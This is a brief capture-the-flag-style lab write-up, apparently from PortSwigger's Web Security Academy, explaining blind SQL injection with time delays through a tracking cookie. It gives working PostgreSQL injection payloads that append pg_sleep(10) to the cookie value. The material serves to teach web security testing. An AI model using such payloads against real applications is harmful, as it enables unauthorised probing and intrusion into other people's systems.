# Blind SQL injection with time delays

This lab contains a blind SQL injection vulnerability in a tracking
cookie. The query result and error behavior do not reveal useful
information directly.

However, the application executes the query synchronously. This makes it
possible to deliberately introduce a delay and use the response time as
an observable signal.

The objective is to exploit the SQL injection and make the server wait
for 10 seconds.

------------------------------------------------------------------------

References:

-   https://portswigger.net/web-security/sql-injection/blind
-   https://portswigger.net/web-security/sql-injection/cheat-sheet

------------------------------------------------------------------------

The injection point is the tracking cookie. Because the lab uses
PostgreSQL, the `pg_sleep()` function can be used to pause execution for
10 seconds:

``` text
COOKIE'||pg_sleep(10)--
```

``` text
TGjY2hbNNRAamLIb'||pg_sleep(10)--
```

<img width="486" height="376" alt="1" src="https://github.com/user-attachments/assets/f50920a3-707c-47f0-9e58-ffc1c9e80ffd" />

